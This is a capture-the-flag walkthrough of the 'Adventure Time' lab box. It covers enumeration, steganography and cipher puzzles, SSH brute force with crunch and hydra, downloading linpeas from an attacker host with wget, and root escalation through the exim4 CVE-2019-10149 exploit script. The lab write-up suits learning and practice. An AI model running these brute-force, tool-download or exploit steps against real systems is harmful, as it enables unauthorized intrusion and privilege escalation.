# Adventure Time - Hard

* Add ```adventuretime.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v adventuretime.thm```:

  * 21/tcp - ftp - vsftpd 3.0.3
  * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.29
  * 443/tcp - ssl/ssl - Apache httpd (SSL-only mode)
  * 31337/tcp - Elite

* We can start with FTP enumeration - ```nmap``` says anonymous mode is supported:

  ```sh
  ftp adventuretime.thm
  # anonymous login

  ls -la
  # we have 6 image files, numbered from 1.jpg to 6.jpg

  mget *
  # fetch all files

  exit
  ```

* The images seem to be normal, but they could contain hidden info:

  ```sh
  steghide info 1.jpg
  # this requires a passphrase
  # we can come back to this later

  # we can run binwalk and extract for all images
  for f in *; do binwalk --dd='.*' $f; done
  # this runs the command "binwalk --dd='.*'" for all files
  # which extracts contents from image

  # from this, two image file contents seem interesting

  ls -la _3.jpg.extracted
  # this contains one more image

  ls -la _5.jpg.extracted
  # this contains additional files
  ```

* We can check these files further using ```string``` or ```binwalk``` again, but I did not find anything useful

* On port 80, the webpage gives a 404 Not Found error; we can still do basic web enumeration:

  ```sh
  gobuster dir -u http://adventuretime.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning
  # nothing found

  # checking with another wordlist to ensure we are not missing anything
  gobuster dir -u http://adventuretime.thm -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # still nothing found

  ffuf -c -u "http://adventuretime.thm" -H "Host: FUZZ.adventuretime.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
  # subdomain enumeration
  # nothing

  gobuster vhost -u http://adventuretime.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enumeration
  # nothing found
  ```

* Web enumeration on port 80 does not give anything, so we need check remaining services

* On port 443, the HTTPS page, we have an image. We can download this image to check further, and simultaneously start our enumeration:

  ```sh
  gobuster dir -u https://adventuretime.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning
  # gives error 'invalid certificate: x509: certificate has expired or is not yet valid'
  # we can use -k to ignore cert

  gobuster dir -u https://adventuretime.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25 -k
  # this gives us another error
  # 'dial tcp' 'device or resource busy'

  # we need to use another tool
  ffuf -u https://adventuretime.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
  # this works

  # checking with another wordlist to ensure we are not missing anything
  gobuster dir -u http://adventuretime.thm -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # still nothing found

  ffuf -c -u "https://adventuretime.thm" -H "Host: FUZZ.adventuretime.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 216 -s
  # subdomain enumeration
  # no subdomains
  ```

* Checking the image downloaded from port 80 for any hidden clues:

  ```sh
  zsteg -a finn-1.png

  binwalk --dd='.*' finn-1.png
  # nothing found
  ```

* From directory scanning on port 443, we get errors with ```gobuster``` but ```ffuf``` works fine - and we get the directory /candybar - we can scan this directory as well:

  ```sh
  ffuf -u https://adventuretime.thm/candybar/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
  # nothing found
  ```

* The /candybar directory gives us an encoded string - we can use CyberChef to decode this.

* When we decode the string from base32, we get a string which looks like ROT-13, but decoding ROT-13 does not make sense - so we can try by shifting the rotate value

* ROT-11 works and we get the plaintext string "Always check the SSL certificate for clues."

* When we view the certificate info for the website, we can see the certificate is verified by "Candy Corporate Inc.". We can click on 'View Certificate' for detailed info:

  * Common Name - adventure-time.com
  * Email address - <bubblegum@land-of-ooo.com>

* This gives us another domain ```land-of-ooo.com``` - we can add this to ```/etc/hosts``` and proceed with web enumeration

* Navigating to this new HTTPS webpage, we get another image which mentions 'resetcode for BMO', and "B's laptop" - here the 'B' could be for 'bubblegum' but we will have to check further.

* We can start web enumeration for this domain:

  ```sh
  ffuf -u https://land-of-ooo.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
  ```

* This gives us a directory /yellowdog; which gives us another clue - "the laptop was guarded by a Banana Guard".

* We can recursively scan this directory as well:

  ```sh
  ffuf -u https://land-of-ooo.com/yellowdog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
  # this gives /bananastock
  # let us scan this as well

  ffuf -u https://land-of-ooo.com/yellowdog/bananastock/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
  ```

* This gives us another directory /bananastock - this contains an image of two Banana Guards talking. This also mentions a password - ```_/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__```

* This looks like Morse code; we can again use CyberChef to decode this

* When decoded from Morse code, we have various options for letter delimiter and word delimiter. On experimenting, we can see that with letter delimiter set to forward slash, and word delimiter set to backslash, we get the passphrase "THE BANANAS ARE THE BEST!!!"

* Furthermore, recursively scanning /bananastock gives us a directory /princess

* This page has another image, which shows that Princess Bubblegum has changed the username and stored in a safe place, which means we will have to do further enumeration

* When we check the source code for the page, we get the following details in a comment:

  ```text
  Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
  Key = my cool password
  IV = abcdefghijklmanopqrstuvwxyz
  Mode = CBC
  Input = hex
  Output = raw
  ```

* When we search for the above keywords, we can see that this is referring to AES CBC encryption

* CyberChef has a recipe for AES Decrypt as well, where we can feed the above values. The output string - "the magic safe is accessibel at port 31337. the magic word is: ricardio"

* We can follow the above instructions:

  ```sh
  nc adventuretime.thm 31337
  # use the above password
  # this gives us new username "apple-guards"
  ```

* We have a valid username-password pair now; login to SSH:

  ```sh
  ssh apple-guards@adventuretime.thm
  # use the previously decoded password

  id
  # apple-guards

  pwd

  ls -la /home
  # we have various users in this box

  ls -la
  # we have some interesting files

  cat flag1

  cat mbox
  ```

* The 'mbox' file shows a mail from 'marceline' to 'apple-guards'; it says that there is a hidden file containing the next clue. We can check ```linpeas``` for further enumeration:

  ```sh
  # in attacker machine
  python3 -m http.server 8000

  # in victim ssh, fetch file
  wget http://10.14.60.78:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  ```

* We do not get anything useful from ```linpeas```. Since the hint is for hidden files, we can attempt to search only for hidden files or files owned by 'marceline':

  ```sh
  find / -type f -iname ".*" -ls 2>/dev/null

  find / -type f -user marceline 2>/dev/null
  ```

* We get only one file owned by 'marceline' - ```/etc/fonts/helper```. We can check this:

  ```sh
  file /etc/fonts/helper
  # seems like an executable

  strings -n 5 /etc/fonts/helper | less
  # no clue

  # trying to run this
  /etc/fonts/helper
  ```

* Running the binary presents us a puzzle:

  ```text
  The key to solve this puzzle is gone
  And you need the key to get this readable: Gpnhkse
  ```

* We have two strings -  a key 'gone' and a string 'Gpnhkse'. This seems to be a Vignere cipher since it involves the use of a key to decode a string

* And sure enough, decoding from Vigenere cipher gives us the passphrase "Abadeer" - we can now run the ```/etc/fonts/helper``` binary again, answer "yes" to the initial question, and feed the passphrase to the prompt

* This gives us the password "My friend Finn" for 'marceline':

  ```sh
  ssh marceline@adventuretime.thm

  ls -la
  
  cat flag2
  # we have another file here

  cat I-got-a-secret.txt
  # this contains a code of 1s and 0s
  ```

* This .txt file contains another puzzle - a string of 1s and 0s that looks like binary code

* We can use CyberChef to decode this, but we get gibberish from binary code. When we use the Magic option however, CyberChef use the 'Bacon Cipher Decode' recipe - but this gives us a string of letters and question marks which does not lead us anywhere

* The hint mentions 'cutlery'; after searching on [CyberChef](https://gchq.github.io/CyberChef/) and [dCode](https://www.dcode.fr/tools-list) for any related ciphers, we stumble upon [Spoon](https://www.dcode.fr/spoon-language) (available under the Programming section) - which is an esoteric language similar to Brainfuck and uses only 0s and 1s

* Using the Spoon decoder, we get the string "The magic word you are looking for is ApplePie"

* We can attempt for SSH of other users with this password, but it does not work; going back, we only had 2 other apps which asked for a passphrase - ```/etc/fonts/helper``` and the binary at port 31337

* Trying this passphrase with the binary:

  ```sh
  nc adventuretime.thm 31337
  # ApplePie

  # this gives us the creds "peppermint-butler:That Black Magic"
  ```

* SSH login for new found user:

  ```sh
  ssh peppermint-butler@adventuretime.thm

  ls -la

  cat flag3
  
  # we have an image here as well
  # we can transfer this to our machine

  # on attacker machine
  scp peppermint-butler@adventuretime.thm:/home/peppermint-butler/butler-1.jpg .
  ```

* The image itself does not give any clue, but we can check for hidden clues using stego tools:

  ```sh
  exiftool butler-1.jpg

  strings butler-1.jpg | less

  binwalk --dd='.*' butler-1.jpg

  stegseek butler-1.jpg /usr/share/wordlists/rockyou.txt
  ```

* The hint mentions passwords, so we can check the box for any files:

  ```sh
  find / -type f -user peppermint-butler 2>/dev/null
  ```

* This gives us two interesting files - ```/usr/share/xml/steg.txt``` and ```/etc/php/zip.txt```:

  ```sh
  less /usr/share/xml/steg.txt
  # this gives password of secret file "ToKeepASecretSafe"

  less /etc/php/zip.txt
  # this gives another password of secret file "ThisIsReallySave"
  ```

* We can try to use these passwords for the image we found earlier:

  ```sh
  steghide extract -sf butler-1.jpg
  # "ToKeepASecretSafe" works here

  # we get a zip file
  unzip secrets.zip
  # we are asked for another password
  # use the other password here

  # this gives us a txt file
  cat secrets.txt
  ```

* This file gives us a target user - 'gunter' and a possible passphrase "The Ice King s????"

* As we do not know the last 4 characters of this password, we can generate a wordlist using ```crunch``` and leverage ```hydra``` for bruteforce:

  ```sh
  # we know the password format is "The Ice King s????"
  # where '?' represents unknown characters

  # we know total length of password is fixed at - 18
  # and we will use crunch for custom charset

  crunch 18 18 -t "The Ice King s@@@@" -o gunterpwd.lst
  # where @ is for any lowercase character
  # this generates a huge wordlist - 26^4

  hydra -l gunter -P gunterpwd.lst ssh://adventuretime.thm
  ```

* An alternative solution is to consider only legit words; following the trend with previous passwords in this box, we can bet on a 5-word lowercase English word starting with the letter 's':

  ```sh
  grep '^s.\{4\}$' /usr/share/dict/words > s-words.txt
  # fetch all 5-letter words
  # starting with lowercase 's'
  # from inbuilt word dictionary, mainly useful for lowercase

  # then we can concatenate it with our known starting string
  # as this one is a small wordlist, we can use a horrible one-liner

  for word in $(cat s-words.txt); do echo "The Ice King $word" >> gunterpwd.lst; done

  hydra -l gunter -P gunterpwd.lst ssh://adventuretime.thm
  ```

* Using either of these methods, we get the password "The Ice King sucks" for 'gunter':

  ```sh
  ssh gunter@adventuretime.thm

  ls -la

  cat flag4

  # we can start enumeration like previously done

  find / -type f -user gunter 2>/dev/null
  
  # we can also enumerate using linpeas

  # on attacker machine
  python3 -m http.server 8000

  # in victim ssh
  cd /tmp

  wget http://10.14.60.78:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  ```

* From ```linpeas```, under the files with SUID bit set, we have a binary I have not seen before - ```/usr/sbin/exim4```

* Googling about this binary shows that it is a mail transfer agent; when we Google for 'exim4 suid', we get a lot of results related to privesc and exploit

* Researching further, it seems ```exim4``` has a [local root privesc vulnerability](https://www.exploit-db.com/exploits/46996) - we can exploit this:

  ```sh
  ls -la /usr/sbin/exim4

  /usr/sbin/exim4 --version
  # version 4.90_1

  # this matches 2019-10149 exploit
  ```

* Now, the exploit script will not work right away; we need to edit the exploit script:

  ```sh
  # check port on which exim4 is running
  ls -la /var/lib/exim4/

  # we have an auto-generated config
  less /var/lib/exim4/config.autogenerated

  # this shows that exim4 is listening on localhost, port 60000

  # we can now transfer the exploit script to the victim box and edit it

  # in victim machine
  vim 46996.sh

  # edit the port number, replace 25 with 60000

  bash 46996.sh -m setuid

  # we get some formatting errors
  # $'\r': command not found

  # seems we are facing issues with carriage-return character
  sed -i 's/\r$//' 46996.sh
  # removes the problematic character

  # run the exploit again
  bash 46996.sh -m setuid

  # we get root shell

  ls -la /root
  # we do not have root flag here
  # need to enumerate

  cat /root/.bash_history
  # this contains location of root flag

  cat /home/bubblegum/Secrets/bmo.txt
  ```
